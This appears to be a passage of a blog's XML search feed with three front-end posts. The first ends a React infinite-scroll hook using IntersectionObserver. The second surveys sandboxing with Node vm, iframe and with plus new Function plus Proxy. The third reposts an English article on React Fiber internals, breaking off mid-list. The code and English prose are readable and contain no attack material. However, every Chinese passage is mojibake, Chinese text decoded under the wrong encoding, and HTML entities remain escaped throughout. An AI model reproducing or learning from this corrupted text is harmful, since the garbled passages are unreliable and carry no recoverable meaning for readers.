&amp; ç»å¯¹å®šä½ è®¡ç®— const refVal = getReference(index, index === lastIndex); // mapå¾ªç¯ä¸­èµ‹äºˆå¤´å°¾ref const id = index === 0 ? 'top' : (index === lastIndex ? 'bottom' : ''); // ç»‘ID return (&lt;li className="li-card" key=&#123;item.key&#125; style=&#123;&#123;top&#125;&#125; ref=&#123;refVal&#125; id=&#123;id&#125;&gt;&#123;item.value&#125;&lt;/li&gt;); &#125;)&#125; &lt;/ul&gt;); 9. å¦‚ä½•ä½¿ç”¨App.js: 123456789101112131415import React from 'react';import './App.css';import &#123; SlidingWindowScrollHook &#125; from "./SlidingWindowScrollHook";import MY_ENDLESS_LIST from './Constants';function App() &#123; return ( &lt;div className="App"&gt; &lt;h1&gt;15ä¸ªå…ƒç´ å®ç°æ— é™æ»šåŠ¨&lt;/h1&gt; &lt;SlidingWindowScrollHook list=&#123;MY_ENDLESS_LIST&#125; height=&#123;195&#125;/&gt; &lt;/div&gt; );&#125;export default App; å®šä¹‰ä¸€ä¸‹æ•°æ® Constants.js: 12345678910111213141516171819const MY_ENDLESS_LIST = [ &#123; key: 1, value: 'A' &#125;, &#123; key: 2, value: 'B' &#125;, &#123; key: 3, value: 'C' &#125;, // ä¸­é—´å°±ä¸è´´äº†... &#123; key: 45, value: 'AS' &#125;] SlidingWindowScrollHook.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import React, &#123; useState, useEffect, useRef &#125; from "react";const THRESHOLD = 15;const SlidingWindowScrollHook = (props) =&gt; &#123; const [start, setStart] = useState(0); const [end, setEnd] = useState(THRESHOLD); const [observer, setObserver] = useState(null); const $bottomElement = useRef(); const $topElement = useRef(); useEffect(() =&gt; &#123; intiateScrollObserver(); return () =&gt; &#123; resetObservation() &#125; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;,[start, end]) const intiateScrollObserver = () =&gt; &#123; const options = &#123; root: null, rootMargin: '0px', threshold: 0.1 &#125;; const Observer = new IntersectionObserver(callback, options) if ($topElement.current) &#123; Observer.observe($topElement.current); &#125; if ($bottomElement.current) &#123; Observer.observe($bottomElement.current); &#125; setObserver(Observer) &#125; const callback = (entries, observer) =&gt; &#123; entries.forEach((entry, index) =&gt; &#123; const listLength = props.list.length; // Scroll Down if (entry.isIntersecting &amp;&amp; entry.target.id === "bottom") &#123; const maxStartIndex = listLength - 1 - THRESHOLD; // Maximum index value `start` can take const maxEndIndex = listLength - 1; // Maximum index value `end` can take const newEnd = (end + 10) &lt;= maxEndIndex ? end + 10 : maxEndIndex; const newStart = (end - 5) &lt;= maxStartIndex ? end - 5 : maxStartIndex; setStart(newStart) setEnd(newEnd) &#125; // Scroll up if (entry.isIntersecting &amp;&amp; entry.target.id === "top") &#123; const newEnd = end === THRESHOLD ? THRESHOLD : (end - 10 &gt; THRESHOLD ? end - 10 : THRESHOLD); let newStart = start === 0 ? 0 : (start - 10 &gt; 0 ? start - 10 : 0); setStart(newStart) setEnd(newEnd) &#125; &#125;); &#125; const resetObservation = () =&gt; &#123; observer &amp;&amp; observer.unobserve($bottomElement.current); observer &amp;&amp; observer.unobserve($topElement.current); &#125; const getReference = (index, isLastIndex) =&gt; &#123; if (index === 0) return $topElement; if (isLastIndex) return $bottomElement; return null; &#125; const &#123;list, height&#125; = props; const updatedList = list.slice(start, end); const lastIndex = updatedList.length - 1; return ( &lt;ul style=&#123;&#123;position: 'relative'&#125;&#125;&gt; &#123;updatedList.map((item, index) =&gt; &#123; const top = (height * (index + start)) + 'px'; const refVal = getReference(index, index === lastIndex); const id = index === 0 ? 'top' : (index === lastIndex ? 'bottom' : ''); return (&lt;li className="li-card" key=&#123;item.key&#125; style=&#123;&#123;top&#125;&#125; ref=&#123;refVal&#125; id=&#123;id&#125;&gt;&#123;item.value&#125;&lt;/li&gt;); &#125;)&#125; &lt;/ul&gt; );&#125;export &#123; SlidingWindowScrollHook &#125;; ä»¥åŠå°‘è®¸æ ·å¼ï¼š 1234567891011.li-card &#123; display: flex; justify-content: center; list-style: none; box-shadow: 2px 2px 9px 0px #bbb; padding: 70px 0; margin-bottom: 20px; border-radius: 10px; position: absolute; width: 80%;&#125; ç„¶åä½ å°±å¯ä»¥æ…¢æ…¢è€äº†ã€‚ã€‚ã€‚ 10. å…¼å®¹æ€§å¤„ç†IntersectionObserverä¸å…¼å®¹Safari? è«æ…Œï¼Œæˆ‘ä»¬æœ‰polyfillç‰ˆ æ¯å‘¨34ä¸‡ä¸‹è½½é‡å‘¢ï¼Œæ”¾å¿ƒç”¨å§è‡­å¼Ÿå¼Ÿä»¬ã€‚ é¡¹ç›®æºåœ°å€ï¼šhttps://github.com/roger-hiro/SlidingWindowScrollHook å‚è€ƒæ–‡ç« ï¼š Creating Infinite Scroll with 15 Elements IntersectionObserveåˆè¯•]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç®¡ä¸­çª¥è±¹å„ç§æ²™ç›’æŠ€æœ¯]]></title>
    <url>%2F2020%2F07%2F30%2FWeb%E5%89%8D%E7%AB%AF%2F%E7%AE%A1%E4%B8%AD%E7%AA%A5%E8%B1%B9%E5%90%84%E7%A7%8D%E6%B2%99%E7%9B%92%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[ç®¡ä¸­çª¥è±¹å„ç§æ²™ç›’æŠ€æœ¯What æ²™ç®±ï¼Œå³ sandboxï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è®©ä½ çš„ç¨‹åºè·‘åœ¨ä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒä¸‹ï¼Œä¸å¯¹å¤–ç•Œçš„å…¶ä»–ç¨‹åºé€ æˆå½±å“ï¼Œé€šè¿‡åˆ›å»ºç±»ä¼¼æ²™ç›’çš„ç‹¬ç«‹ä½œä¸šç¯å¢ƒï¼Œåœ¨å…¶å†…éƒ¨è¿è¡Œçš„ç¨‹åºå¹¶ä¸èƒ½å¯¹ç¡¬ç›˜äº§ç”Ÿæ°¸ä¹…æ€§çš„å½±å“ã€‚ä¸¾ä¸ªç®€å•çš„æ —å­ï¼Œå…¶å®æˆ‘ä»¬çš„æµè§ˆå™¨ï¼ŒChrome ä¸­çš„æ¯ä¸€ä¸ªæ ‡ç­¾é¡µéƒ½æ˜¯ä¸€ä¸ªæ²™ç®±ï¼ˆsandboxï¼‰ã€‚æ¸²æŸ“è¿›ç¨‹è¢«æ²™ç®±ï¼ˆsandboxï¼‰éš”ç¦»ï¼Œç½‘é¡µ web ä»£ç å†…å®¹å¿…é¡»é€šè¿‡ IPC é€šé“æ‰èƒ½ä¸æµè§ˆå™¨å†…æ ¸è¿›ç¨‹é€šä¿¡ï¼Œé€šä¿¡è¿‡ç¨‹ä¼šè¿›è¡Œå®‰å…¨çš„æ£€æŸ¥ã€‚æ²™ç®±è®¾è®¡çš„ç›®çš„æ˜¯ä¸ºäº†è®©ä¸å¯ä¿¡çš„ä»£ç è¿è¡Œåœ¨ä¸€å®šçš„ç¯å¢ƒä¸­ï¼Œä»è€Œé™åˆ¶è¿™äº›ä»£ç è®¿é—®éš”ç¦»åŒºä¹‹å¤–çš„èµ„æºã€‚ â€” æ‘˜è‡ªï¼šè¯´è¯´JSä¸­çš„æ²™ç®± ä¸€è¨€ä»¥è”½ä¹‹ï¼Œæ²™ç›’ï¼ˆsandboxï¼‰å°±æ˜¯ç¨‹åºè¿è¡Œæ—¶çš„éš”ç¦»ç¯å¢ƒï¼Œä»¥æ­¤å±è”½ç¨‹åºè¿è¡Œæ—¶å¯¹å¤–ç•Œçš„ä¸€åˆ‡å‰¯ä½œç”¨ã€‚å…¶å®æˆ‘ä»¬å·²ç»åœ¨å·¥ä½œä¸­æ¥è§¦åˆ°äº†å„ç§æ²™ç›’æŠ€æœ¯ï¼š docker ï¼šå¤§åé¼é¼åˆè€³ç†Ÿèƒ½è¯¦çš„å®¹å™¨æŠ€æœ¯æ–¹æ¡ˆï¼ŒæœåŠ¡ç«¯çš„å¾®æœåŠ¡ä¸»è¦å°±æ˜¯é€šè¿‡ docker æŠ€æœ¯å®ç°è™šæ‹ŸåŒ–çš„åº•å±‚æ”¯æŒï¼Œä½¿æœåŠ¡å¼€å‘è€…å¯ä»¥ä½“ä¼šä¸åˆ°ç¯å¢ƒçš„åŒºåˆ«ã€æŠ¹å¹³è¿è¡Œæ—¶å·®å¼‚çš„ã€‚å¯ä»¥è¯´å¯¹å¾®æœåŠ¡æ¥è¯´ï¼Œdocker æ˜¯è¿™äº›å¹´èƒ½å¾—åˆ°å¦‚æ­¤çš„å‘å±•çš„ä¸€ä¸ªåŸºçŸ³ã€‚ æ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼šç¨‹åºæ˜¯æŒ‡ä»¤ã€æ•°æ®åŠå…¶ç»„ç»‡å½¢å¼çš„æè¿°ï¼Œè¿›ç¨‹æ˜¯ç¨‹åºçš„å®ä½“ï¼Œè¿›ç¨‹é—´ç›¸äº’éš”ç¦»ï¼Œé€šè¿‡ IPC æœºåˆ¶è¿›è¡Œé€šä¿¡ã€‚ä¸Šè¿° chrome tab å…¶å®å°±æ˜¯ä¸€ä¸ªè¿›ç¨‹å•¦ã€‚ Node.js VMï¼šNode.js é»˜è®¤æä¾›çš„ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼ŒVM æ¨¡å—æä¾›äº†ä¸€ç³»åˆ— API ç”¨äºåœ¨ V8 è™šæ‹Ÿæœºç¯å¢ƒä¸­ç¼–è¯‘å’Œè¿è¡Œä»£ç ã€‚JavaScript ä»£ç å¯ä»¥è¢«ç¼–è¯‘å¹¶ç«‹å³è¿è¡Œï¼Œæˆ–ç¼–è¯‘ã€ä¿å­˜ç„¶åå†è¿è¡Œã€‚ 12345const vm = require(&apos;vm&apos;);const script = new vm.Script(&apos;m + n&apos;);const sandbox = &#123; m: 1, n: 2 &#125;;const context = new vm.createContext(sandbox);script.runInContext(context); iframeï¼šä¸€ç§å¤è€çš„æ²™ç›’äº†ï¼Œæ–¹ä¾¿ã€ç®€å•ã€ä½†ä¸æ€ä¹ˆå®‰å…¨ï¼Œåœ¨çº¿ä»£ç ç¼–è¾‘ https://codesandbox.io/s/news å°±ä½¿ç”¨äº† iframe æ–¹å¼åˆ›å»ºéš”ç¦»ç¯å¢ƒã€‚ 1&lt;iframe sandbox src=&quot;...&quot; /&gt; Why å¼•å…¥ç¬¬ä¸‰æ–¹è„šæœ¬ï¼ˆå¼€æºã€ISV å…¥é©»ï¼‰å¦‚æœä¸åšéš”ç¦»ä¼šå¼•èµ·å®‰å…¨é—®é¢˜ï¼Œå¦‚ app crashã€èµ„æŸã€‚ æŒç»­ğŸ”¥çš„â€œå¾®å‰ç«¯â€ä¸­æ²™ç›’ç¯å¢ƒä¿è¯è¿è¡Œæ—¶çš„ app éš”ç¦»å’Œ css éš”ç¦»ã€‚ Howwith + new Function + proxyeval å’Œ new Function éƒ½è¢«ç”¨æ¥åŠ¨æ€æ‰§è¡Œä¸€æ®µè„šæœ¬ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äº eval æ˜¯å…¨å±€å¯¹è±¡çš„ä¸€ä¸ªå‡½æ•°å±æ€§ï¼Œæ‰§è¡Œçš„ä»£ç æ‹¥æœ‰ç€å’Œåº”ç”¨ä¸­å…¶å®ƒæ­£å¸¸ä»£ç ä¸€æ ·çš„çš„æƒé™ï¼Œå®ƒèƒ½è®¿é—®ã€Œæ‰§è¡Œä¸Šä¸‹æ–‡ã€ä¸­çš„å±€éƒ¨å˜é‡ï¼Œä¹Ÿèƒ½è®¿é—®æ‰€æœ‰ã€Œå…¨å±€å˜é‡ã€ Function æ„é€ å™¨ç”Ÿæˆçš„å‡½æ•°ï¼Œå¹¶ä¸ä¼šåœ¨åˆ›å»ºå®ƒçš„ä¸Šä¸‹æ–‡ä¸­åˆ›å»ºé—­åŒ…ï¼Œä¸€èˆ¬åœ¨å…¨å±€ä½œç”¨åŸŸä¸­è¢«åˆ›å»ºã€‚å½“è¿è¡Œå‡½æ•°çš„æ—¶å€™ï¼Œåªèƒ½è®¿é—®è‡ªå·±çš„æœ¬åœ°å˜é‡å’Œå…¨å±€å˜é‡ï¼Œä¸èƒ½è®¿é—® Function æ„é€ å™¨è¢«è°ƒç”¨ç”Ÿæˆçš„ä¸Šä¸‹æ–‡çš„ä½œç”¨åŸŸã€‚ 1234function compileCode (src) &#123; src = &apos;with (sandbox) &#123;&apos; + src + &apos;&#125;&apos; return new Function(&apos;sandbox&apos;, src)&#125; æ— è®º eval è¿˜æ˜¯ functionï¼Œæ‰§è¡Œæ—¶éƒ½ä¼šæŠŠä½œç”¨åŸŸä¸€å±‚ä¸€å±‚å‘ä¸ŠæŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä¼šä¸€ç›´åˆ° global é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ ES6 ç‰¹æ€§ Proxy çš„åŸç†å°±æ˜¯ï¼Œè®©æ‰§è¡Œäº†ä»£ç åœ¨ sandobx ä¸­æ‰¾çš„åˆ°ï¼Œä»¥è¾¾åˆ°ã€Œé˜²é€ƒé€¸ã€çš„ç›®çš„ã€‚ 1234567891011function evalute(code,sandbox) &#123; sandbox = sandbox || Object.create(null); const fn = new Function(&apos;sandbox&apos;, `with(sandbox)&#123;return ($&#123;code&#125;)&#125;`); const proxy = new Proxy(sandbox, &#123; has(target, key) &#123; // è®©åŠ¨æ€æ‰§è¡Œçš„ä»£ç è®¤ä¸ºå±æ€§å·²å­˜åœ¨ return true; &#125; &#125;); return fn(proxy);&#125; ä¸Šè¿°æ–¹æ¡ˆåœ¨å¤§éƒ¨åˆ†åœºæ™¯å·²ç»å¤Ÿç”¨äº†ï¼Œä½†è¿™ä¾ç„¶ä¸æ˜¯ä¸€ä¸ªç»å¯¹å®‰å…¨çš„æ²™ç›’ï¼Œç•™ä¸ªè¯¾åä½œä¸šï¼Œè¯•è¯•çœ‹å¦‚ä½•çªç ´è¿™ä¸ª sandbox ã€‚ **** ç”Ÿäº§ç¯å¢ƒä¸‹çš„å®è·µ123456789101112131415// è·å–å¼‚æ­¥æ¨¡å— _findAsyncModule = (codePieces = []) =&gt; &#123; if (!isArray(codePieces) || codePieces.length &lt;= 0) &#123; return null; &#125; try &#123; new Function(&apos;REQUIRE_MAP&apos;, `;$&#123;codePieces.join(&apos;&apos;)&#125;`)(REQUIRE_MAP); const source = codePieces[0]; const moduleName = source.match(MODULE_NAME_IN_SOURCE_REG)[1]; return window.require(moduleName); &#125; catch (error) &#123; throw error; &#125; &#125;; é˜¿é‡Œäº‘å¾®å‰ç«¯æ–¹æ¡ˆæ²™ç®± wepback çš„æ’ä»¶åœ¨åº”ç”¨ä»£ç æ„å»ºçš„æ—¶å€™ç»™å­åº”ç”¨ä»£ç åŠ ä¸Šä¸€å±‚ wrap ä»£ç ï¼Œåˆ›å»ºä¸€ä¸ªé—­åŒ…ï¼ŒæŠŠéœ€è¦éš”ç¦»çš„æµè§ˆå™¨åŸç”Ÿå¯¹è±¡å˜æˆä»ä¸‹é¢å‡½æ•°é—­åŒ…ä¸­è·å–çš„ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥åœ¨åº”ç”¨åŠ è½½çš„æ—¶å€™ï¼Œä¼ å…¥æ¨¡æ‹Ÿæ‰çš„ windowï¼Œdocument ä¹‹ç±»çš„å¯¹è±¡ã€‚ 1234567// æ‰“åŒ…ä»£ç __CONSOLE_OS_GLOBAL_HOOK__(id, function (require, module, exports, &#123;window, document, location, history&#125;) &#123; /* æ‰“åŒ…ä»£ç  */&#125;)function __CONSOLE_OS_GLOBAL_HOOK__(id, entry) &#123; entry(require, module, exports, &#123;window, document, location, history&#125;)&#125; é€šè¿‡ new iframe å¯¹è±¡ï¼ŒæŠŠé‡Œé¢çš„åŸç”Ÿæµè§ˆå™¨å¯¹è±¡é€šè¿‡ contentWindow å–å‡ºæ¥ï¼Œå®ç°è¿™ä¸€å †æµè§ˆå™¨çš„åŸç”Ÿå¯¹è±¡ã€‚ é˜¿é‡Œäº‘å¼€æ”¾å¹³å°å¾®å‰ç«¯æ–¹æ¡ˆçš„æ²™ç®±å®ç°ï¼šhttps://developer.aliyun.com/article/761446 å‚è€ƒ æ ‡å‡†å¾®å‰ç«¯æ¶æ„åœ¨èš‚èšçš„è½åœ°å®è·µ é˜¿é‡Œäº‘å¼€æ”¾å¹³å°å¾®å‰ç«¯æ–¹æ¡ˆçš„æ²™ç®±å®ç°]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F07%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FInside%20Fiber%3A%20in-depth%20overview%20of%20the%20new%20reconciliation%20algorithm%20in%20React%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª https://indepth.dev/ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://indepth.dev/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react/ Inside Fiber: in-depth overview of the new reconciliation algorithm in ReactMax Koretskyi15 March, 202019 min read Dive deep into Reactâ€™s new architecture called Fiber and learn about two main phases of the new reconciliation algorithm. Weâ€™ll take a detailed look at how React updates state and props and processes children. React is a JavaScript library for building user interfaces. At its core lies the mechanism that tracks changes in a component state and projects the updated state to the screen. In React we know this process as \reconciliation**. We call the setState method and the framework checks if the state or props have changed and re-renders a component on UI. Reactâ€™s docs provide a good high-level overview of the mechanism: the role of React elements, lifecycle methods and the render method, and the diffing algorithm applied to a componentâ€™s children. The tree of immutable React elements returned from the render method is commonly known as the â€œvirtual DOMâ€. That term helped explain React to people early on, but it also caused confusion and isnâ€™t used in the React documentation anymore. In this article Iâ€™ll stick to calling it a tree of React elements. Besides the tree of React elements, the framework has always had a tree of internal instances (components, DOM nodes etc.) used to keep the state.Starting from version 16, React rolled out a new implementation of that internal instances tree and the algorithm that manages it code-named \Fiber**. To learn about the advantages which the Fiber architecture brings check out The how and why on Reactâ€™s usage of linked list in Fiber. This is the first article in the series aimed at teaching you internal architecture of React. In this article I want to provide an in-depth overview of important concepts and data structures relevant to the algorithm. Once we have enough background, weâ€™ll explore the algorithm and main functions used to traverse and process the fiber tree. Next articles in the series will demonstrate how React uses the algorithm to perform initial render and process state and props updates. From there weâ€™ll move on to the details of the scheduler, the child reconciliation process, and the mechanism of building an effects list. Iâ€™m going to give you some pretty advanced knowledge here ?â€. I encourage you to read it to understand the magic behind the inner workings of Concurrent React. This series of articles will also serve you as a great guide if you plan to start contributing to React. Iâ€™m a strong believer in reverse-engineering, so there will be a lot of links to the sources from the recent version 16.6.0. Itâ€™s definitely quite a lot to take in, so donâ€™t feel stressed if you donâ€™t understand something right away. It takes time as everything worthwhile. \Note that you donâ€™t need to know any of it to use React. This article is about how React works internally.** THIS AD MAKES CONTENT FREE. HIDE Setting the background#Hereâ€™s a simple application that Iâ€™ll use throughout the series. We have a button that simply increments a number rendered on the screen: And hereâ€™s the implementation: 123456789101112131415161718192021class ClickCounter extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;count: 0&#125;; this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; this.setState((state) =&gt; &#123; return &#123;count: state.count + 1&#125;; &#125;); &#125; render() &#123; return [ &lt;button key="1" onClick=&#123;this.handleClick&#125;&gt;Update counter&lt;/button&gt;, &lt;span key="2"&gt;&#123;this.state.count&#125;&lt;/span&gt; ] &#125;&#125;&lt;&gt; You can play with it here. As you can see, itâ€™s a simple component that returns two child elements button and span from the render method. As soon as you click on the button, the state of the component is updated inside the handler. This, in turn, results in the text update for the span element. There are various activities React performs during \reconciliation**. For example, here are the high-level operations React performs during the first render and after state update in our simple application: updates count property in the state of ClickCounter retrieves and compares children of ClickCounter and their props updates props for the span element There are other activities performed during \reconciliation** like calling lifecycle methods or updating refs. \All these activities are collectively referred to as â€œworkâ€ in the Fiber architecture.** The type of work usually depends on the type of React element. For example, for a class component, React needs to create an instance, while it doesnâ€™t do that for a functional component. As you know, we have many kinds of elements in React, e.g. class and functional components, host components (DOM nodes), portals etc. The type of React element is defined by the first parameter to the createElement function. This function is generally used in the render method to create an element. Before we begin our exploration of the activities and the main fiber algorithm, letâ€™s first get ourselves familiar with the data structures used internally by React. From React Elements to Fiber nodes#Every component in React has a UI representation we can call a view or a template thatâ€™s returned from the render method. Hereâ€™s the template for our ClickCounter component: 12&lt;button key="1" onClick=&#123;this.onClick&#125;&gt;Update counter&lt;/button&gt;&lt;span key="2"&gt;&#123;this.state.count&#125;&lt;/span&gt;&lt;&gt; React Elements#Once a template goes through the JSX compiler, you end up with a bunch of React elements. This is whatâ€™s really returned from the render method of React components, not HTML. Since weâ€™re not required to use JSX, the render method for our ClickCounter component could be re-written like this: 12345678910111213141516171819202122class ClickCounter &#123; ... render() &#123; return [ React.createElement( 'button', &#123; key: '1', onClick: this.onClick &#125;, 'Update counter' ), React.createElement( 'span', &#123; key: '2' &#125;, this.state.count ) ] &#125;&#125;&lt;&gt; The calls to React.createElement in the render method will create two data structures like this: 12345678910111213141516171819[ &#123; $$typeof: Symbol(react.element), type: 'button', key: "1", props: &#123; children: 'Update counter', onClick: () =&gt; &#123; ... &#125; &#125; &#125;, &#123; $$typeof: Symbol(react.element), type: 'span', key: "2", props: &#123; children: 0 &#125; &#125;]&lt;&gt; You can see that React adds the property $$typeof to these objects to uniquely identify them as React elements. Then we have properties type, key and props that describe the element. The values are taken from what you pass to the React.createElement function. Notice how React represents text content as children of the span and button nodes. And how the click handler is part of the button element props. There are other fields on React elements like the ref field that are beyond the scope of this article. The React element for ClickCounter doesnâ€™t have any props or a key: 1234567&#123; $$typeof: Symbol(react.element), key: null, props: &#123;&#125;, ref: null, type: ClickCounter&#125;&lt;&gt; Fiber nodes#During \reconciliation** data from every React element returned from the render method is merged into the tree of fiber nodes.Every React element has a corresponding fiber node. Unlike React elements, fibers arenâ€™t re-created on every render.These are mutable data structures that hold components state and DOM. We discussed earlier that depending on the type of a React element the framework needs to perform different activities. In our sample application, for the class components ClickCounter it calls lifecycle methods and the render method, whereas for the span host component (DOM node) it performs DOM mutation. So each React element is converted into a Fiber node of corresponding type that describes the work that needs to be done. \You can think of a fiber as a data structure that represents some work to do or, in other words, a unit of work. Fiberâ€™s architecture also provides a convenient way to track, schedule, pause and abort the work.** When a React element is converted into a fiber node for the first time, React uses the data from the element to create a fiber in the createFiberFromTypeAndProps function. In the consequent updates React reuses the fiber node and just updates the necessary properties using data from a corresponding React element. React may also need to move the node in the hierarchy based on the key prop or delete it if the corresponding React element is no longer returned from the render method. Check out the \ChildReconciler** function to see the list of all activities and corresponding functions React performs for existing fiber nodes. Because React creates a fiber for each React element and since we have a tree of those elements, weâ€™re going to have a tree of fiber nodes. In the case of our sample application it looks like this: All fiber nodes are connected through a linked list using the following properties on fiber nodes: child, sibling and return. For more details on why it works this way, check out my article The how and why on Reactâ€™s usage of linked list in Fiber if you havenâ€™t read it already. Current and work in progress trees#After the first render, React ends up with a fiber tree that reflects the state of the application that was used to render the UI. This tree is often referred to as current. When React starts working on updates it builds a so-called workInProgress tree that reflects the future state to be flushed to the screen. All work is performed on fibers from the workInProgress tree. As React goes through the current tree, for each existing fiber node it creates an alternate node that constitutes the workInProgress tree. This node is created using the data from React elements returned by the render method. Once the updates are processed and all related work is completed, React will have an alternate tree ready to be flushed to the screen. Once this workInProgress tree is rendered on the screen, it becomes the current tree. One of Reactâ€™s core principles is consistency. React always updates the DOM in one go â€” it doesnâ€™t show partial results. The workInProgress tree serves as a â€œdraftâ€ thatâ€™s not visible to the user, so that React can process all components first, and then flush their changes to the screen. In the sources youâ€™ll see a lot of functions that take fiber nodes from both the current and workInProgress trees. Hereâ€™s the signature of one such function: 12function updateHostComponent(current, workInProgress, renderExpirationTime) &#123;...&#125;&lt;&gt; Each fiber node holds a reference to its counterpart from the other tree in the \alternate** field. A node from the current tree points to the node from the workInProgress tree and vice versa. Side-effects#We can think of a component in React as a function that uses the state and props to compute the UI representation.Every other activity like mutating the DOM or calling lifecycle methods should be considered a side-effect or, simply, an effect. Effects are also mentioned in the docs: Youâ€™ve likely performed data fetching, subscriptions, or manually \changing the DOM** from React components before. We call these operations â€œside effectsâ€ (or â€œeffectsâ€ for short) because they can affect other components and canâ€™t be done during rendering. You can see how most state and props updates will lead to side-effects. And since applying effects is a type of work, a fiber node is a convenient mechanism to track effects in addition to updates. Each fiber node can have effects associated with it. They are encoded in the effectTag field. So effects in Fiber basically define the work that needs to be done for instances after updates have been processed. For host components (DOM elements) the work consists of adding, updating or removing elements. For class components React may need to update refs and call the componentDidMount and componentDidUpdate lifecycle methods. There are also other effects corresponding to other types of fibers. Effects list#React processes updates very quickly and to achieve that level of performance it employs a few interesting techniques. \One of them is building a linear list of fiber nodes with effects for quick iteration.** Iterating the linear list is much faster than a tree, and thereâ€™s no need to spend time on nodes without side-effects. The goal of this list is to mark nodes that have DOM updates or other effects associated with them. This list is a subset of the finishedWork tree and is linked using the nextEffect property instead of the child property used in the current and workInProgress trees. Dan Abramov offered an analogy for an effects list. He likes to think of it as a Christmas tree, with â€œChristmas lightsâ€ binding all effectful nodes together. To visualize this, letâ€™s imagine the following tree of fiber nodes where the highlighted nodes have some work to do. For example, our update caused c2 to be inserted into the DOM, d2 and c1 to change attributes, and b2 to fire a lifecycle method. The effect list will link them together so React can skip other nodes later: You can see how the nodes with effects are linked together. When going over the nodes, React uses the firstEffect pointer to figure out where the list starts. So the diagram above can be represented as a linear list like this: Root of the fiber tree#Every React application has one or more DOM elements that act as containers. In our case itâ€™s the div element with the ID container. 12const domContainer = document.querySelector('#container');ReactDOM.render(React.createElement(ClickCounter), domContainer);&lt;&gt; React creates a fiber root object for each of those containers. You can access it using the reference to the DOM element: 12const fiberRoot = query('#container')._reactRootContainer._internalRoot&lt;&gt; This fiber root is where React holds the reference to a fiber tree. It is stored in the current property of the fiber root: 1const hostRootFiberNode = fiberRoot.current&lt;&gt; The fiber tree starts with a special type of fiber node which is HostRoot. Itâ€™s created internally and acts as a parent for your topmost component. Thereâ€™s a link from the HostRoot fiber node back to the FiberRoot through the stateNode property: 1fiberRoot.current.stateNode === fiberRoot; // true&lt;&gt; You can explore the fiber tree by accessing the topmost HostRoot fiber node through the fiber root. Or you can get an individual fiber node from a component instance like this: 1compInstance._reactInternalFiber&lt;&gt; Fiber node structure#Letâ€™s now take a look at the structure of fiber nodes created for the ClickCounter component: 12345678910111213&#123; stateNode: new ClickCounter, type: ClickCounter, alternate: null, key: null, updateQueue: null, memoizedState: &#123;count: 0&#125;, pendingProps: &#123;&#125;, memoizedProps: &#123;&#125;, tag: 1, effectTag: 0, nextEffect: null&#125;&lt;&gt; and the span DOM element: 12345678910111213&#123; stateNode: new HTMLSpanElement, type: "span", alternate: null, key: "2", updateQueue: null, memoizedState: null, pendingProps: &#123;children: 0&#125;, memoizedProps: &#123;children: 0&#125;, tag: 5, effectTag: 0, nextEffect: null&#125;&lt;&gt; Thereâ€™s quite a lot of fields on fiber nodes. Iâ€™ve described the purpose of the fields alternate, effectTag and nextEffect in previous sections. Letâ€™s now see why we need others. stateNode#Holds the reference to the class instance of a component, a DOM node or other React element type associated with the fiber node. In general, we can say that this property is used to hold the local state associated with a fiber. type#Defines the function or class associated with this fiber. For class components, it points to the constructor function and for DOM elements it specifies the HTML tag. I use this field quite often to understand what element a fiber node is related to. tag#Defines the type of the fiber. Itâ€™s used in the reconciliation algorithm to determine what work needs to be done. As mentioned earlier, the work varies depending on the type of React element. The function createFiberFromTypeAndProps maps a React element to the corresponding fiber node type. In our application, the property tag for the ClickCounter component is 1 which denotes a ClassComponent and for the span element itâ€™s 5 denoting a HostComponent. updateQueue#A queue of state updates, callbacks and DOM updates. memoizedState#State of the fiber that was used to create the output. When processing updates it reflects the state thatâ€™s currently rendered on the screen. memoizedProps#Props of the fiber that were used to create the output during the previous render. pendingProps#Props that have been updated from new data in React elements and need to be applied to child components or DOM elements. key#Unique identifier with a group of children to help React figure out which items have changed, have been added or removed from the list. Itâ€™s related to the â€œlists and keysâ€ functionality of React described here. You can find the complete structure of a fiber node here. Iâ€™ve omitted a bunch of fields in the explanation above. Particularly, I skipped the pointers child, sibling and return that make up a tree data structure which I described in my previous article. And a category of fields like expirationTime, childExpirationTime and mode that are specific to Scheduler. General algorithm#React performs work in two main phases: \render** and \commit**. During the first render phase React applies updates to components scheduled through setState or React.render and figures out what needs to be updated in the UI. If itâ€™s the initial render, React creates a new fiber node for each element returned from the render method. In the following updates, fibers for existing React elements are re-used and updated. \The result of the phase is a tree of fiber nodes marked with side-effects.** The effects describe the work that needs to be done during the following commit phase.During this phase React takes a fiber tree marked with effects and applies them to instances. It goes over the list of effects and performs DOM updates and other changes visible to a user. \Itâ€™s important to understand that the work during the first** render \phase can be performed asynchronously.** React can process one or more fiber nodes depending on the available time, then stop to stash the work done and yield to some event. It then continues from where it left off. Sometimes though, it may need to discard the work done and start from the top again.These pauses are made possible by the fact that the work performed during this phase doesnâ€™t lead to any user-visible changes, like DOM updates. \In contrast, the following** commit \phase is always synchronous**. This is because the work performed during this stage leads to changes visible to the user, e.g. DOM updates. Thatâ€™s why React needs to do them in a single pass. Calling lifecycle methods is one type of work performed by React. Some methods are called during the render phase and others during the commit phase. Hereâ€™s the list of lifecycles called when working through the first render phase: [UNSAFE_]componentWillMount (deprecated) [UNSAFE_]componentWillReceiveProps (deprecated) getDerivedStateFromProps shouldComponentUpdate 